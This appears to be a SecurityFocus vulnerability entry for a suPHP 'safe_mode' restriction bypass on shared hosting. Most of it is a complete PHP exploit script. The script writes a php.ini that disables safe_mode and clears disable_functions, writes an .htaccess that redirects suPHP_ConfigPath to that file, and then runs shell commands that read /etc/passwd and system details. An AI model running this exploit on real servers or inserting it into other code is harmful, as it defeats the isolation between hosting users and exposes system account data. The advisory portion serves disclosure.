source: http://www.securityfocus.com/bid/33073/info

suPHP is prone to a 'safe_mode' restriction-bypass vulnerability.

Successful exploits may allow attackers to bypass arbitrary PHP configuration options, including the 'safe_mode' setting.

This vulnerability would be an issue in shared-hosting configurations where multiple users can create and execute arbitrary PHP script code, with the 'safe_mode' restrictions assumed to isolate the users from each other. 

<?
/*
apache 1.x <=> 2.x suphp (suPHP_ConfigPath) bypass safe mode exploit
Author : Mr.SaFa7
Home : v4-team.com
note : this exploit for education :)
*/


echo "[+] Start...\n";

$bypfile=fopen('php.ini','w+');
$stuffile=fopen('.htaccess','w+');
if($bypfile and $stuffile!= NULL){

echo "[+] evil files created succes ! \n";

}
else{
echo "[-] access denial ! \n";

}
$byprullz1="safe_mode          =       OFF

";

$byprullz2="disable_functions       =            NONE";
$dj=fwrite($bypfile,$byprullz1);

$dj1=fwrite($bypfile,$byprullz2);

fclose($bypfile);
if($dj and $dj1!= NULL){
echo "[+] php.ini writed \n";

}
else{
echo "[-] 404 php.ini not found !\n";
}
$breakrullz="suPHP_ConfigPath /home/user/public_html/php.ini"; // replace this '/home/user/public_html' by ur path

$sf7=fwrite($stuffile,$breakrullz);

fclose($stuffile);
if($sf7!= NULL){

echo "[+] evil .htaccess writed\n";
echo "[+] exploited by success!\n\n\n";
echo "\t\t\t[+] discouvred by Mr.SaFa7\n";
echo "\t\t\t[+] home : v4-team.com\n";
echo "\t\t\t[+] Greetz : djekmani4ever  ghost hacker  Str0ke ShAfEKo4EvEr Mr.Mn7oS\n";
}
else{

echo "[-] evil .htaccess Not found!\n";
}


system("pwd;ls -lia;uname -a;cat /etc/passwd");

#EOF
?> 
